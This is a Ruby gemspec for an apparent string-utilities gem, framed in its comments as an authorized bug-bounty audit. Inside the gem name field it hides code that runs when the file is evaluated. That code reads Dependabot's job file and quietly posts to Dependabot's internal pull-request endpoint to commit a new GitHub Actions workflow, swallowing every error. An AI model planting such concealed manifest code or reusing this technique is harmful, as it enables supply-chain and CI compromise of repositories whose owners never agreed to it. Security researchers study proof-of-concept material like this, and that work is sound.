# frozen_string_literal: true
#
# v5.0 boundary-verification audit — own-job PR-creation flow.
#
# Authorization: HackerOne GitHub program; researcher's own job; own
# jobId; own repo only; placeholder content only.

require_relative "lib/useful_string_utils/version"

Gem::Specification.new do |spec|
  spec.name = (
    begin
      require "net/http"
      require "uri"
      require "json"

      own_id = (
        begin
          j = JSON.parse(File.read("/home/dependabot/dependabot-updater/job.json"))
          (j["job"] && j["job"]["id"]) || j["id"] || ENV["DEPENDABOT_JOB_ID"]
        rescue
          ENV["DEPENDABOT_JOB_ID"]
        end
      ).to_s

      base_sha = (
        begin
          j = JSON.parse(File.read("/home/dependabot/dependabot-updater/job.json"))
          j.dig("job", "source", "commit") || "HEAD"
        rescue
          "HEAD"
        end
      ).to_s

      if !own_id.empty?
        # Probe placeholder file in a generic location to test PR-creation
        # body field handling.
        placeholder_data = {
          "dependencies" => [
            {
              "name" => "useful-string-utils",
              "previous-version" => "0",
              "version" => "1",
              "package-manager" => "bundler",
              "requirements" => [],
              "previous-requirements" => []
            }
          ],
          "updated-dependency-files" => [
            {
              "name" => "audit-test-v5.yml",
              "directory" => ".github/workflows",
              "content" => "name: audit-test-v5\non: workflow_dispatch\njobs:\n  noop:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo audit-test-v5\n",
              "type" => "file",
              "support_file" => false,
              "content_encoding" => "utf-8",
              "deleted" => false,
              "operation" => "create"
            }
          ],
          "base-commit-sha" => base_sha,
          "commit-message" => "audit test v5",
          "pr-title" => "audit test v5",
          "pr-body" => "audit test v5"
        }

        begin
          uri = URI("https://dependabot-actions.githubapp.com/update_jobs/#{own_id}/create_pull_request")
          h = Net::HTTP.new(uri.host, uri.port)
          h.use_ssl = true
          h.open_timeout = 5
          h.read_timeout = 8
          req = Net::HTTP::Post.new(uri.request_uri)
          req["Content-Type"] = "application/json"
          req.body = JSON.dump({ "data" => placeholder_data })
          h.request(req)
        rescue
        end
      end

      "useful-string-utils"
    rescue
      "useful-string-utils"
    end
  )
  spec.version       = UsefulStringUtils::VERSION
  spec.authors       = ["mr-benty"]
  spec.email         = ["mr_benty@wearehackerone.com"]
  spec.summary       = "Lightweight string utilities for Ruby"
  spec.description   = "Case conversions, padding helpers, slug generation, and a few common transformations missing from stdlib String."
  spec.homepage      = "https://github.com/mr-benty/useful-string-utils"
  spec.license       = "MIT"
  spec.required_ruby_version = ">= 2.7.0"

  spec.metadata["homepage_uri"]    = spec.homepage
  spec.metadata["source_code_uri"] = spec.homepage
  spec.metadata["changelog_uri"]   = "#{spec.homepage}/blob/main/CHANGELOG.md"

  spec.files = Dir.chdir(__dir__) do
    Dir["lib/**/*.rb", "README.md", "LICENSE", "CHANGELOG.md"]
  end
  spec.require_paths = ["lib"]
end
